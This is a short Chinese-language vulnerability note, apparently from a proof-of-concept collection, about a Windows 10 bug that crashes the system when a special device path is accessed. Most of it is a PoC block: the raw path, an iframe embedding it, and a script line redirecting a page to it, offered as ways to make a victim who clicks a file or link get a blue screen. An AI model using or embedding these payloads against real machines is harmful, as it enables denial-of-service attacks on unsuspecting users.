# Microsoft Windows 10 蓝屏死机漏洞

此漏洞影响 Microsoft windows 10 系统，攻击者可以通过发送带有 \\.\globalroot\device\condrv\kernelconnect 链接的文件，诱导受害者点击，利用成功可导致机器蓝屏死机。

**PoC：**

```bash
\\.\globalroot\device\condrv\kernelconnect
<iframe src="\\.\globalroot\device\condrv\kernelconnect"></iframe>
<scrpt>document.location = '\\\\.\\globalroot\\device\\condrv\\kernelconnect';</script>
```

ref:

https://www.bleepingcomputer.com/news/security/windows-10-bug-crashes-your-pc-when-you-access-this-location/